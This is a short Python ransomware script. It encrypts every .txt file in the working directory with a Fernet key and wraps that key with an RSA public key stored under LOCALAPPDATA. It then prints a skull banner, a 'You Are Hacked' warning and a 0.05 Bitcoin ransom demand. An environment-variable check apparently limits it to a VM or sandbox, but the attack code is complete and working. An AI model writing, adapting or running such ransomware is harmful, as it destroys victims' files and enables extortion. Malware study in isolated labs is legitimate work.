import os, base64, sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet


def encrypt(plaintext: bytes, key: Fernet) -> None:
    return key.encrypt(plaintext)

def encryption(key: bytes):
    save_key("public_key.pem", key, "ransomware")
    fernet = Fernet(key)
    files = os.listdir()
    for file in files:
        if file.endswith(".txt"):
            with open(file,"rb") as f:
                plaintext = f.read()
            with open(file,"wb") as f:
                f.write(encrypt(plaintext, fernet))

def save_key(keyfile: str, key: bytes, save_loc, filename = "keyfile"):
    with open(keyfile, "rb") as f:
        public_key = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )

    encrypted_key = base64.b64encode(public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))

    path = os.path.join(os.getenv("LOCALAPPDATA"), save_loc)
    if not os.path.exists(path):
        os.mkdir(path)
    with open(os.path.join(path, filename), "wb") as f:
        f.write(encrypted_key)

skull = '''
                     ______
                  .-"      "-.
                 /            \\
                |              |
                |,  .-.  .-.  ,|
           /\\   | )(__/  \\__)( |
         _ \\/   |/     /\\     \\|
        \\_\\/    (_     ^^     _)   .-==/~\\
       ___/_,__,_\\__|IIIIII|__/__)/   /{~}}
       ---,---,---|-\\IIIIII/-|---,\\'-' {{~}
                  \\          /     '-==\\}/
                   `--------`
'''

if 'RUNNING_ON_VM' not in os.environ:
    print("Please run this exe in a safe environment i.e. \
VM or sandbox and set RUNNING_ON_VM environment variable")
    sys.exit(1)

try: 
    encryption(Fernet.generate_key())
    print(skull)
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    print("\n You Are Hacked \n")
    print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
    print("Pay 0.05 Bitcoin to address xxx in 24 hours else your files will be gone forever.\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")

except Exception as e:
    print("Encryption Failed")
    print("Damn Failed Attempt")
    print(e)